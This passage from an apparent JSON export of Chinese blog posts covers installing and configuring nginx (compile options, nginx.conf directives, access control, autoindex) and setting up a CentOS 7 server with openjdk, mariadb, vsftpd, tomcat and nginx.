class=\"hljs-attribute\">-For</span> <span class=\"hljs-variable\">$proxy_add_x_forwarded_for</span>;</code></pre>\n\n<p>这四个暂且这样设，如果深究的话，每一个都涉及到很复杂的内容，也将通过另一篇文章来解读。</p>\n\n<p>关于location匹配规则的写法，可以说尤为关键且基础的，参考文章 nginx配置location总结及rewrite规则写法;</p>\n\n\n\n<h3 id=\"23-其它\">2.3 其它</h3>\n\n\n\n<h4 id=\"231-访问控制-allowdeny\">2.3.1 访问控制 allow/deny</h4>\n\n<p>Nginx 的访问控制模块默认就会安装，而且写法也非常简单，可以分别有多个allow,deny，允许或禁止某个ip或ip段访问，依次满足任何一个规则就停止往下匹配。如：</p>\n\n<pre class=\"prettyprint\"><code class=\" hljs nginx\"><span class=\"hljs-title\">location</span> /nginx-status {\n  <span class=\"hljs-title\">stub_status</span> <span class=\"hljs-built_in\">on</span>;\n  <span class=\"hljs-title\">access_log</span> <span class=\"hljs-built_in\">off</span>;\n<span class=\"hljs-comment\">#  auth_basic   \"NginxStatus\";</span>\n<span class=\"hljs-comment\">#  auth_basic_user_file   /usr/local/nginx-1.6/htpasswd;</span>\n\n  <span class=\"hljs-title\">allow</span> <span class=\"hljs-number\">192.168.10.100</span>;\n  <span class=\"hljs-title\">allow</span> <span class=\"hljs-number\">172.29.73.0</span>/<span class=\"hljs-number\">24</span>;\n  <span class=\"hljs-title\">deny</span> all;\n}</code></pre>\n\n<p>我们也常用 httpd-devel 工具的 htpasswd 来为访问的路径设置登录密码：</p>\n\n<pre class=\"prettyprint\"><code class=\" hljs vala\"><span class=\"hljs-preprocessor\"># htpasswd -c htpasswd admin</span>\nNew passwd:\nRe-type <span class=\"hljs-keyword\">new</span> password:\nAdding password <span class=\"hljs-keyword\">for</span> user admin\n\n<span class=\"hljs-preprocessor\"># htpasswd htpasswd admin    //修改admin密码</span>\n<span class=\"hljs-preprocessor\"># htpasswd htpasswd sean    //多添加一个认证用户</span></code></pre>\n\n<p>这样就生成了默认使用CRYPT加密的密码文件。打开上面nginx-status的两行注释，重启nginx生效。</p>\n\n\n\n<h4 id=\"232-列出目录-autoindex\">2.3.2 列出目录 autoindex</h4>\n\n<p>Nginx默认是不允许列出整个目录的。如需此功能，打开nginx.conf文件，在location，server 或 http段中加入autoindex on;，另外两个参数最好也加上去:</p>\n\n<p>autoindex_exact_size off; 默认为on，显示出文件的确切大小，单位是bytes。改为off后，显示出文件的大概大小，单位是kB或者MB或者GB <br>\nautoindex_localtime on; <br>\n默认为off，显示的文件时间为GMT时间。改为on后，显示的文件时间为文件的服务器时间</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs coffeescript\">location /images {\n  root   /<span class=\"hljs-reserved\">var</span>/www/nginx-<span class=\"hljs-reserved\">default</span>/images;\n  autoindex <span class=\"hljs-literal\">on</span>;\n  autoindex_exact_size <span class=\"hljs-literal\">off</span>;\n  autoindex_localtime <span class=\"hljs-literal\">on</span>;\n  }</code></pre>\n\n<p>参考</p>\n\n<p><a href=\"http://liuqunying.blog.51cto.com/3984207/1420556\">http://liuqunying.blog.51cto.com/3984207/1420556</a> <br>\n<a href=\"http://nginx.org/en/docs/ngx_core_module.html#worker_cpu_affinity\">http://nginx.org/en/docs/ngx_core_module.html#worker_cpu_affinity</a> <br>\n<a href=\"http://wiki.nginx.org/HttpCoreModule#sendfile\">http://wiki.nginx.org/HttpCoreModule#sendfile</a></p>",
			"markdowncontent":">转载自[sean](http://seanlook.com/2015/05/17/nginx-install-and-config/)\n\n********\n\n>nginx在工作中已经有好几个环境在使用了，每次都是重新去网上扒博客，各种编译配置，今天自己也整理一份安装文档和nginx.conf配置选项的说明，留作以后参考。像负载均衡配置（包括健康检查）、缓存（包括清空缓存）配置实例，请参考 http://seanlook.com/2015/05/17/nginx-install-and-config ，ssl加密请参考 http://seanlook.com/2015/05/28/nginx-ssl/ 。\n\n#1. 安装nginx\n##1.1 选择稳定版本\n我们编译安装nginx来定制自己的模块，机器CentOS 6.2 x86_64。首先安装缺少的依赖包：\n``` \nyum -y install gcc gcc-c++ make libtool zlib zlib-devel openssl openssl-devel pcre pcre-devel\n```\n这些软件包如果yum上没有的话可以下载源码来编译安装，只是要注意编译时默认安装的目录，确保下面在安装nginx时能够找到这些动态库文件（ldconfig）。\n\n从 http://nginx.org/en/download.html 下载稳定版nginx-1.6.3.tar.gz到/usr/local/src下解压。\n\n为了后续准备我们另外下载2个插件模块：**nginx_upstream_check_module-0.3.0.tar.gz **—— 检查后端服务器的状态，***nginx-goodies-nginx-sticky-module-ng-bd312d586752.tar.gz**（建议在*/usr/local/src*下解压后将目录重命名为**nginx-sticky-module-ng-1.2.5**） —— 后端做负载均衡解决session sticky问题（与upstream_check模块结合使用需要另外打补丁，请参考nginx负载均衡配置实战）。\n\n请注意插件与nginx的版本兼容问题，一般插件越新越好，nginx不用追新，稳定第一。nginx-1.4.7，nginx-sticky-module-1.1，nginx_upstream_check_module-0.2.0，这个搭配也没问题。sticky-1.1与nginx-1.6版本由于更新没跟上编译出错。（可以直接使用Tengine，默认就包括了这些模块）\n\n```\n[root@cachets nginx-1.6.3]# pwd\n/usr/local/src/nginx-1.6.3\n[root@cachets nginx-1.6.3]# ./configure --prefix=/usr/local/nginx-1.6 --with-pcre \\\n> --with-http_stub_status_module --with-http_ssl_module \\\n> --with-http_gzip_static_module --with-http_realip_module \\\n> --add-module=../nginx_upstream_check_module-0.3.0\n[root@cachets nginx-1.6.3]# make && make install\n```\n##1.2 常用编译选项说明\nnginx大部分常用模块，编译时./configure --help以--without开头的都默认安装。\n\n**--prefix=PATH** ： 指定nginx的安装目录。默认 /usr/local/nginx\n**--conf-path=PATH** ： 设置nginx.conf配置文件的路径。nginx允许使用不同的配置文件启动，通过命令行中的-c选项。默认为prefix/conf/nginx.conf\n**--user=name**： 设置nginx工作进程的用户。安装完成后，可以随时在nginx.conf配置文件更改user指令。默认的用户名是nobody。--group=name类似\n**--with-pcre** ： 设置PCRE库的源码路径，如果已通过yum方式安装，使用--with-pcre自动找到库文件。使用--with-pcre=PATH时，需要从PCRE网站下载pcre库的源码（版本4.4 - 8.30）并解压，剩下的就交给Nginx的./configure和make来完成。perl正则表达式使用在location指令和 ngx_http_rewrite_module模块中。\n**--with-zlib=PATH** ： 指定 zlib（版本1.1.3 - 1.2.5）的源码解压目录。在默认就启用的网络传输压缩模块ngx_http_gzip_module时需要使用zlib 。\n**--with-http_ssl_module** ： 使用https协议模块。默认情况下，该模块没有被构建。前提是openssl与openssl-devel已安装\n**--with-http_stub_status_module** ： 用来监控 Nginx 的当前状态\n**--with-http_realip_module** ： 通过这个模块允许我们改变客户端请求头中客户端IP地址值(例如X-Real-IP 或 X-Forwarded-For)，意义在于能够使得后台服务器记录原始客户端的IP地址\n**--add-module=PATH** ： 添加第三方外部模块，如nginx-sticky-module-ng或缓存模块。每次添加新的模块都要重新编译（Tengine可以在新加入module时无需重新编译）\n再提供一种编译方案：\n```\n./configure \\\n> --prefix=/usr \\\n> --sbin-path=/usr/sbin/nginx \\\n> --conf-path=/etc/nginx/nginx.conf \\\n> --error-log-path=/var/log/nginx/error.log \\\n> --http-log-path=/var/log/nginx/access.log \\\n> --pid-path=/var/run/nginx/nginx.pid  \\\n> --lock-path=/var/lock/nginx.lock \\   \n> --user=nginx \\\n> --group=nginx \\\n> --with-http_ssl_module \\\n> --with-http_stub_status_module \\\n> --with-http_gzip_static_module \\\n> --http-client-body-temp-path=/var/tmp/nginx/client/ \\\n> --http-proxy-temp-path=/var/tmp/nginx/proxy/ \\\n> --http-fastcgi-temp-path=/var/tmp/nginx/fcgi/ \\\n> --http-uwsgi-temp-path=/var/tmp/nginx/uwsgi \\\n> --with-pcre=../pcre-7.8\n> --with-zlib=../zlib-1.2.3\n```\n##1.3 启动关闭nginx\n\n 检查配置文件是否正确\n\n```\n# /usr/local/nginx-1.6/sbin/nginx -t \n# ./sbin/nginx -V     # 可以看到编译选项\n## 启动、关闭\n# ./sbin/nginx        # 默认配置文件 conf/nginx.conf，-c 指定\n# ./sbin/nginx -s stop\n或 pkill nginx\n## 重启，不会改变启动时指定的配置文件\n# ./sbin/nginx -s reload\n```\n\n或 kill -HUP `cat /usr/local/nginx-1.6/logs/nginx.pid`\n当然也可以将 nginx 作为系统服务管理，下载 nginx 到/etc/init.d/，修改里面的路径然后赋予可执行权限。\n\n\n```\n# service nginx {start|stop|status|restart|reload|configtest}\n```\n\n##1.4 yum安装\nyum安装rpm包会比编译安装简单很多，默认会安装许多模块，但缺点是如果你想以后安装第三方模块那就没办法了。\n```\n# vi /etc/yum.repo.d/nginx.repo \n[nginx] \nname=nginx repo \nbaseurl=http://nginx.org/packages/centos/$releasever/$basearch/ \ngpgcheck=0 \nenabled=1\n```\n\n剩下的就`yum install nginx`搞定，也可以yum install nginx-1.6.3安装指定版本（前提是你去packages里看到有对应的版本，默认是最新版稳定版）。\n\n###2. nginx.conf配置文件\nNginx配置文件主要分成四部分：main（全局设置）、server（主机设置）、upstream（上游服务器设置，主要为反向代理、负载均衡相关配置）和 location（URL匹配特定位置后的设置），每部分包含若干个指令。main部分设置的指令将影响其它所有部分的设置；server部分的指令主要用于指定虚拟主机域名、IP和端口；upstream的指令用于设置一系列的后端服务器，设置反向代理及后端服务器的负载均衡；location部分用于匹配网页位置（比如，根目录“/”,“/images”,等等）。他们之间的关系式：server继承main，location继承server；upstream既不会继承指令也不会被继承。它有自己的特殊指令，不需要在其他地方的应用。\n\n当前nginx支持的几个指令上下文：\n\n####2.1 通用\n下面的nginx.conf简单的实现nginx在前端做反向代理服务器的例子，处理js、png等静态文件，jsp等动态请求转发到其它服务器tomcat：\n\n```\nuser  www www;\nworker_processes  2;\n\nerror_log  logs/error.log;\n#error_log  logs/error.log  notice;\n#error_log  logs/error.log  info;\n\npid        logs/nginx.pid;\n\n\nevents {\n    use epoll;\n    worker_connections  2048;\n}\n\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n\n    #log_format  main  '$remote_addr - $remote_user [$time_local] \"$request\" '\n    #                  '$status $body_bytes_sent \"$http_referer\" '\n    #                  '\"$http_user_agent\" \"$http_x_forwarded_for\"';\n\n    #access_log  logs/access.log  main;\n\n    sendfile        on;\n    # tcp_nopush     on;\n\n    keepalive_timeout  65;\n\n  # gzip压缩功能设置\n    gzip on;\n    gzip_min_length 1k;\n    gzip_buffers    4 16k;\n    gzip_http_version 1.0;\n    gzip_comp_level 6;\n    gzip_types text/html text/plain text/css text/javascript application/json application/javascript application/x-javascript application/xml;\n    gzip_vary on;\n  \n  # http_proxy 设置\n    client_max_body_size   10m;\n    client_body_buffer_size   128k;\n    proxy_connect_timeout   75;\n    proxy_send_timeout   75;\n    proxy_read_timeout   75;\n    proxy_buffer_size   4k;\n    proxy_buffers   4 32k;\n    proxy_busy_buffers_size   64k;\n    proxy_temp_file_write_size  64k;\n    proxy_temp_path   /usr/local/nginx/proxy_temp 1 2;\n\n  # 设定负载均衡后台服务器列表 \n    upstream  backend  { \n              #ip_hash; \n              server   192.168.10.100:8080 max_fails=2 fail_timeout=30s ;  \n              server   192.168.10.101:8080 max_fails=2 fail_timeout=30s ;  \n    }\n\n  # 很重要的虚拟主机配置\n    server {\n        listen       80;\n        server_name  itoatest.example.com;\n        root   /apps/oaapp;\n\n        charset utf-8;\n        access_log  logs/host.access.log  main;\n\n        #对 / 所有做负载均衡+反向代理\n        location / {\n            root   /apps/oaapp;\n            index  index.jsp index.html index.htm;\n\n            proxy_pass        http://backend;  \n            proxy_redirect off;\n            # 后端的Web服务器可以通过X-Forwarded-For获取用户真实IP\n            proxy_set_header  Host  $host;\n            proxy_set_header  X-Real-IP  $remote_addr;  \n            proxy_set_header  X-Forwarded-For  $proxy_add_x_forwarded_for;\n            proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;\n            \n        }\n\n        #静态文件，nginx自己处理，不去backend请求tomcat\n        location  ~* /download/ {  \n            root /apps/oa/fs;  \n            \n        }\n        location ~ .*\\.(gif|jpg|jpeg|bmp|png|ico|txt|js|css)$   \n        {   \n            root /apps/oaapp;   \n            expires      7d; \n        }\n       \tlocation /nginx_status {\n            stub_status on;\n            access_log off;\n            allow 192.168.10.0/24;\n            deny all;\n        }\n\n        location ~ ^/(WEB-INF)/ {   \n            deny all;   \n        }\n        #error_page  404              /404.html;\n\n        # redirect server error pages to the static page /50x.html\n        #\n        error_page   500 502 503 504  /50x.html;\n        location = /50x.html {\n            root   html;\n        }\n    }\n  ## 其它虚拟主机，server 指令开始\n}\n```\n\n###2.2 常用指令说明\n####2.2.1 main全局配置\n\nnginx在运行时与具体业务功能（比如http服务或者email服务代理）无关的一些参数，比如工作进程数，运行的身份等。\n\n`woker_processes 2`\n在配置文件的顶级main部分，worker角色的工作进程的个数，master进程是接收并分配请求给worker处理。这个数值简单一点可以设置为cpu的核数grep ^processor /proc/cpuinfo | wc -l，也是 auto 值，如果开启了ssl和gzip更应该设置成与逻辑CPU数量一样甚至为2倍，可以减少I/O操作。如果nginx服务器还有其它服务，可以考虑适当减少。\n\n`worker_cpu_affinity`\n也是写在main部分。在高并发情况下，通过设置cpu粘性来降低由于多CPU核切换造成的寄存器等现场重建带来的性能损耗。如worker_cpu_affinity 0001 0010 0100 1000; （四核）。\n\n`worker_connections 2048`\n写在events部分。每一个worker进程能并发处理（发起）的最大连接数（包含与客户端或后端被代理服务器间等所有连接数）。nginx作为反向代理服务器，计算公式 最大连接数 = worker_processes * worker_connections/4，所以这里客户端最大连接数是1024，这个可以增到到8192都没关系，看情况而定，但不能超过后面的worker_rlimit_nofile。当nginx作为http服务器时，计算公式里面是除以2。\n\n`worker_rlimit_nofile 10240`\n写在main部分。默认是没有设置，可以限制为操作系统最大的限制65535。\n\n`use epoll`\n写在events部分。在Linux操作系统下，nginx默认使用epoll事件模型，得益于此，nginx在Linux操作系统下效率相当高。同时Nginx在OpenBSD或FreeBSD操作系统上采用类似于epoll的高效事件模型kqueue。在操作系统不支持这些高效模型时才使用select。\n\n####2.2.2 http服务器\n\n与提供http服务相关的一些配置参数。例如：是否使用keepalive啊，是否使用gzip进行压缩等。\n\n`sendfile on`\n开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，减少用户空间到内核空间的上下文切换。对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。\n\n`keepalive_timeout 65 `: 长连接超时时间，单位是秒，这个参数很敏感，涉及浏览器的种类、后端服务器的超时设置、操作系统的设置，可以另外起一片文章了。长连接请求大量小文件的时候，可以减少重建连接的开销，但假如有大文件上传，65s内没上传完成会导致失败。如果设置时间过长，用户又多，长时间保持连接会占用大量资源。\n\n`send_timeout `: 用于指定响应客户端的超时时间。这个超时仅限于两个连接活动之间的时间，如果超过这个时间，客户端没有任何活动，Nginx将会关闭连接。\n\n`client_max_body_size 10m`\n允许客户端请求的最大单文件字节数。如果有上传较大文件，请设置它的限制值\n\n`client_body_buffer_size 128k`\n缓冲区代理缓冲用户端请求的最大字节数\n模块http_proxy：\n这个模块实现的是nginx作为反向代理服务器的功能，包括缓存功能（另见文章）\n\n`proxy_connect_timeout 60`\nnginx跟后端服务器连接超时时间(代理连接超时)\n`proxy_read_timeout 60`\n连接成功后，与后端服务器两个成功的响应操作之间超时时间(代理接收超时)\n\n`proxy_buffer_size 4k`\n设置代理服务器（nginx）从后端realserver读取并保存用户头信息的缓冲区大小，默认与proxy_buffers大小相同，其实可以将这个指令值设的小一点\n\n`proxy_buffers 4 32k`\nproxy_buffers缓冲区，nginx针对单个连接缓存来自后端realserver的响应，网页平均在32k以下的话，这样设置\n\n`proxy_busy_buffers_size 64k`\n高负荷下缓冲大小（proxy_buffers*2）\n\n`proxy_max_temp_file_size`\n当 proxy_buffers 放不下后端服务器的响应内容时，会将一部分保存到硬盘的临时文件中，这个值用来设置最大临时文件大小，默认1024M，它与 proxy_cache 没有关系。大于这个值，将从upstream服务器传回。设置为0禁用。\n\n`proxy_temp_file_write_size 64k`\n当缓存被代理的服务器响应到临时文件时，这个选项限制每次写临时文件的大小。proxy_temp_path（可以在编译的时候）指定写到哪那个目录。\n\nproxy_pass，proxy_redirect见 location 部分。\n\n模块http_gzip：\n\n`gzip on` : 开启gzip压缩输出，减少网络传输。\n`gzip_min_length 1k `： 设置允许压缩的页面最小字节数，页面字节数从header头得content-length中进行获取。默认值是20。建议设置成大于1k的字节数，小于1k可能会越压越大。\n`gzip_buffers 4 16k `： 设置系统获取几个单位的缓存用于存储gzip的压缩结果数据流。4 16k代表以16k为单位，安装原始数据大小以16k为单位的4倍申请内存。\n`gzip_http_version 1.0 `： 用于识别 http 协议的版本，早期的浏览器不支持 Gzip 压缩，用户就会看到乱码，所以为了支持前期版本加上了这个选项，如果你用了 Nginx 的反向代理并期望也启用 Gzip 压缩的话，由于末端通信是 http/1.0，故请设置为 1.0。\n`gzip_comp_level 6 `： gzip压缩比，1压缩比最小处理速度最快，9压缩比最大但处理速度最慢(传输快但比较消耗cpu)\n`gzip_types `：匹配mime类型进行压缩，无论是否指定,”text/html”类型总是会被压缩的。\n`gzip_proxied any `： Nginx作为反向代理的时候启用，决定开启或者关闭后端服务器返回的结果是否压缩，匹配的前提是后端服务器必须要返回包含”Via”的 header头。\n`gzip_vary on `： 和http头有关系，会在响应头加个 Vary: Accept-Encoding ，可以让前端的缓存服务器缓存经过gzip压缩的页面，例如，用Squid缓存经过Nginx压缩的数据。。\n2.2.3 server虚拟主机\n\nhttp服务上支持若干虚拟主机。每个虚拟主机一个对应的server配置项，配置项里面包含该虚拟主机相关的配置。在提供mail服务的代理时，也可以建立若干server。每个server通过监听地址或端口来区分。\n\nlisten\n监听端口，默认80，小于1024的要以root启动。可以为listen *:80、listen 127.0.0.1:80等形式。\n\nserver_name\n服务器名，如localhost、www.example.com，可以通过正则匹配。\n\n模块http_stream\n这个模块通过一个简单的调度算法来实现客户端IP到后端服务器的负载均衡，upstream后接负载均衡器的名字，后端realserver以 host:port options; 方式组织在 {} 中。如果后端被代理的只有一台，也可以直接写在 proxy_pass 。\n\n2.2.4 location\n\nhttp服务中，某些特定的URL对应的一系列配置项。\n\n`root /var/www/html`\n定义服务器的默认网站根目录位置。如果locationURL匹配的是子目录或文件，root没什么作用，一般放在server指令里面或/下。\n\n`index index.jsp index.html index.htm`\n定义路径下默认访问的文件名，一般跟着root放\n\n`proxy_pass http:/backend`\n请求转向backend定义的服务器列表，即反向代理，对应upstream负载均衡器。也可以proxy_pass http://ip:port。\n\n```\nproxy_redirect off;\nproxy_set_header Host $host;\nproxy_set_header X-Real-IP $remote_addr;\nproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n```\n\n这四个暂且这样设，如果深究的话，每一个都涉及到很复杂的内容，也将通过另一篇文章来解读。\n\n关于location匹配规则的写法，可以说尤为关键且基础的，参考文章 nginx配置location总结及rewrite规则写法;\n\n###2.3 其它\n####2.3.1 访问控制 allow/deny\n\nNginx 的访问控制模块默认就会安装，而且写法也非常简单，可以分别有多个allow,deny，允许或禁止某个ip或ip段访问，依次满足任何一个规则就停止往下匹配。如：\n```\nlocation /nginx-status {\n  stub_status on;\n  access_log off;\n#  auth_basic   \"NginxStatus\";\n#  auth_basic_user_file   /usr/local/nginx-1.6/htpasswd;\n\n  allow 192.168.10.100;\n  allow 172.29.73.0/24;\n  deny all;\n}\n```\n\n我们也常用 httpd-devel 工具的 htpasswd 来为访问的路径设置登录密码：\n\n```\n# htpasswd -c htpasswd admin\nNew passwd:\nRe-type new password:\nAdding password for user admin\n\n# htpasswd htpasswd admin    //修改admin密码\n# htpasswd htpasswd sean    //多添加一个认证用户\n```\n\n这样就生成了默认使用CRYPT加密的密码文件。打开上面nginx-status的两行注释，重启nginx生效。\n\n####2.3.2 列出目录 autoindex\n\nNginx默认是不允许列出整个目录的。如需此功能，打开nginx.conf文件，在location，server 或 http段中加入autoindex on;，另外两个参数最好也加上去:\n\nautoindex_exact_size off; 默认为on，显示出文件的确切大小，单位是bytes。改为off后，显示出文件的大概大小，单位是kB或者MB或者GB\nautoindex_localtime on;\n默认为off，显示的文件时间为GMT时间。改为on后，显示的文件时间为文件的服务器时间\n\n```\nlocation /images {\n  root   /var/www/nginx-default/images;\n  autoindex on;\n  autoindex_exact_size off;\n  autoindex_localtime on;\n  }\n```\n\n参考\n\nhttp://liuqunying.blog.51cto.com/3984207/1420556\nhttp://nginx.org/en/docs/ngx_core_module.html#worker_cpu_affinity\nhttp://wiki.nginx.org/HttpCoreModule#sendfile",
			"tags":"",
			"id":"51443067",
			"categories":"linux,nginx",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2016年05月17日 16:54:10",
			"articleedittype":1,
			"private":0,
			"channel":"12",
			"description":"centos7搭建tomcat+openjdk+mysql+vsftpd安装openjdkyum install java-1.7.0-openjdk* -y  安装mysql\n  由于CentOS 7 版本将MySQL数据库软件从默认的程序列表中移除，用mariadb代替，所以安装mariabd使用yum安装mariadb\nyum install mariadb-server mariadb操作m",
			"title":"centos7下搭建tomcat+openjdk+mysql+vsftpd+nginx",
			"type":"original",
			"content":"<h1 id=\"centos7下搭建tomcatopenjdkmysqlvsftpdnginx\">centos7下搭建tomcat+openjdk+mysql+vsftpd+nginx</h1>\n\n\n\n<h2 id=\"安装openjdk\">安装openjdk</h2>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">yum install java<span class=\"hljs-subst\">-</span><span class=\"hljs-number\">1.7</span><span class=\"hljs-number\">.0</span><span class=\"hljs-attribute\">-openjdk</span><span class=\"hljs-subst\">*</span> <span class=\"hljs-attribute\">-y</span>  </code></pre>\n\n<hr>\n\n\n\n<h2 id=\"安装mysql\">安装mysql</h2>\n\n<blockquote>\n  <p>由于CentOS 7 版本将MySQL数据库软件从默认的程序列表中移除，用mariadb代替，所以安装mariabd</p>\n</blockquote>\n\n<ul>\n<li>使用yum安装mariadb</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs axapta\">yum install mariadb-<span class=\"hljs-keyword\">server</span> mariadb</code></pre>\n\n<p><strong>操作mariadb的命令是：</strong></p>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs vbnet\">systemctl start mariadb  <span class=\"hljs-preprocessor\">#启动MariaDB</span>\nsystemctl <span class=\"hljs-keyword\">stop</span> mariadb  <span class=\"hljs-preprocessor\">#停止MariaDB</span>\nsystemctl restart mariadb  <span class=\"hljs-preprocessor\">#重启MariaDB</span>\nsystemctl enable mariadb  <span class=\"hljs-preprocessor\">#设置开机启动</span></code></pre>\n\n<ul>\n<li>启动数据库</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs sql\">systemctl <span class=\"hljs-operator\"><span class=\"hljs-keyword\">start</span> mariadb</span></code></pre>\n\n<blockquote>\n  <p>默认账号是root，没有密码，所以直接登陆</p>\n</blockquote>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs lasso\">mysql <span class=\"hljs-attribute\">-u</span> root</code></pre>\n\n<ul>\n<li>配置mysql的编码，打开文件/etc/my.cnf,加上下段代码</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs cs\">[mysql]\n<span class=\"hljs-keyword\">default</span>-character-<span class=\"hljs-keyword\">set</span> =utf8</code></pre>\n\n<ul>\n<li>创建一个mysql用户,并设置可以远程访问</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs sql\"><span class=\"hljs-operator\"><span class=\"hljs-keyword\">grant</span> <span class=\"hljs-keyword\">usage</span> <span class=\"hljs-keyword\">on</span> *.* <span class=\"hljs-keyword\">to</span> <span class=\"hljs-string\">'fred'</span>@<span class=\"hljs-string\">'localhost'</span> identified <span class=\"hljs-keyword\">by</span> <span class=\"hljs-string\">'fred'</span>;</span>//创建用户fred密码ferd\n<span class=\"hljs-operator\"><span class=\"hljs-keyword\">select</span> host,<span class=\"hljs-keyword\">user</span>,password <span class=\"hljs-keyword\">from</span> mysql.<span class=\"hljs-keyword\">user</span> <span class=\"hljs-keyword\">where</span> <span class=\"hljs-keyword\">user</span>=<span class=\"hljs-string\">'fred'</span>;</span>//查看记录  \n<span class=\"hljs-operator\"><span class=\"hljs-keyword\">grant</span> <span class=\"hljs-keyword\">all</span> <span class=\"hljs-keyword\">privileges</span> <span class=\"hljs-keyword\">on</span> *.* <span class=\"hljs-keyword\">to</span> fred@<span class=\"hljs-string\">'%'</span>identified <span class=\"hljs-keyword\">by</span> <span class=\"hljs-string\">'fred'</span>;</span>//设置可以远程访问</code></pre>\n\n<hr>\n\n\n\n<h2 id=\"安装vsftpd\">安装vsftpd</h2>\n\n<ul>\n<li>使用yum安装vsftpd</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\"><span class=\"hljs-built_in\">sudo</span> yum install vsftpd</code></pre>\n\n<ul>\n<li>添加ftp用户</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs cs\">adduser userftp   <span class=\"hljs-comment\">//添加用户</span>\npasswd userftp</code></pre>\n\n<ul>\n<li>禁止用户ssh登录，只能ftp访问</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs bash\">usermod <span class=\"hljs-operator\">-s</span> /sbin/nologin userftp</code></pre>\n\n<ul>\n<li>配置vsftp </li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs objectivec\">sudo vi /etc/vsftpd/vstfpd<span class=\"hljs-variable\">.conf</span>\nanonymous_enable=<span class=\"hljs-literal\">NO</span>  <span class=\"hljs-comment\">//关闭匿名访问</span>\nlocal_enable=<span class=\"hljs-literal\">YES</span>  <span class=\"hljs-comment\">//只能访问自己的主目录</span>\nlocal_root=/data/doc <span class=\"hljs-comment\">//设置主目录</span>\nsudo service vsftpd restart <span class=\"hljs-comment\">//重启</span>\nckconfig vsftpd on <span class=\"hljs-comment\">//设置开机自启动</span></code></pre>\n\n<hr>\n\n\n\n<h2 id=\"安装tomcat\">安装tomcat</h2>\n\n<ul>\n<li>使用get命令下载并解压</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs avrasm\">wget http://mirrors<span class=\"hljs-preprocessor\">.noc</span><span class=\"hljs-preprocessor\">.im</span>/apache/tomcat/tomcat-<span class=\"hljs-number\">7</span>/v7<span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.69</span>/bin/apache-tomcat-<span class=\"hljs-number\">7.0</span><span class=\"hljs-number\">.69</span><span class=\"hljs-preprocessor\">.zip</span>\nunzip apache-tomcat-<span class=\"hljs-number\">7.0</span><span class=\"hljs-number\">.69</span><span class=\"hljs-preprocessor\">.zip</span></code></pre>\n\n<hr>\n\n\n\n<h2 id=\"安装nginx\">安装nginx</h2>\n\n<ul>\n<li>yum安装</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs cmake\">yum -y <span class=\"hljs-keyword\">install</span> nginx</code></pre>\n\n<ul>\n<li>编辑默认配置文件并修改一些参数</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs applescript\">    gzip  <span class=\"hljs-function_start\"><span class=\"hljs-keyword\">on</span></span>;\n    gzip_min_length <span class=\"hljs-number\">1</span>k;\n    gzip_buffers    <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">16</span>k;\n    gzip_http_version <span class=\"hljs-number\">1.0</span>;\n    gzip_comp_level <span class=\"hljs-number\">6</span>;\n    gzip_types <span class=\"hljs-type\">text</span>/html <span class=\"hljs-type\">text</span>/plain <span class=\"hljs-type\">text</span>/css <span class=\"hljs-type\">text</span>/javascript <span class=\"hljs-type\">application</span>/json <span class=\"hljs-type\">application</span>/javascript <span class=\"hljs-type\">application</span>/x-javascript <span class=\"hljs-type\">application</span>/xml;\n    gzip_vary <span class=\"hljs-function_start\"><span class=\"hljs-keyword\">on</span></span>;\n    proxy_cache_path /nginx/cache levels=<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">2</span> keys_zone=<span class=\"hljs-keyword\">first</span>:<span class=\"hljs-number\">10</span>m inactive=<span class=\"hljs-number\">24</span>h max_size=<span class=\"hljs-number\">1</span>G; <span class=\"hljs-comment\">#新建缓存路径与相关属性</span>\n    upstream backend { <span class=\"hljs-comment\">#建立后端tomcat服务器</span>\n    server <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">8080</span> weight=<span class=\"hljs-number\">1</span>;\n   }</code></pre>\n\n<ul>\n<li>修改默认的nginx配置.文件路径为<strong>/etc/nginx/nginx.conf</strong></li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\" hljs perl\">    <span class=\"hljs-keyword\">listen</span>  <span class=\"hljs-number\">80</span>;\n    <span class=\"hljs-comment\">#return 500;</span>\n    server_name blog.yoqu.org ;\n    <span class=\"hljs-keyword\">index</span> <span class=\"hljs-keyword\">index</span>.html <span class=\"hljs-keyword\">index</span>.htm <span class=\"hljs-keyword\">index</span>.jsp;<span class=\"hljs-comment\">#设定访问的默认首页地址</span>\n    root  /web/webapp;<span class=\"hljs-comment\">#设定网站的资源存放路径</span>\n    <span class=\"hljs-comment\">#charset koi8-r;</span>\n    <span class=\"hljs-comment\">#access_log  /var/log/nginx/log/host.access.log  main;</span>\n\n    location / {\n        <span class=\"hljs-comment\">#root  /usr/software/tomcat/webapps/finalcms;</span>\n        <span class=\"hljs-comment\">#index  index.html index.htm;</span>\n        proxy_pass http:<span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0</span>.<span 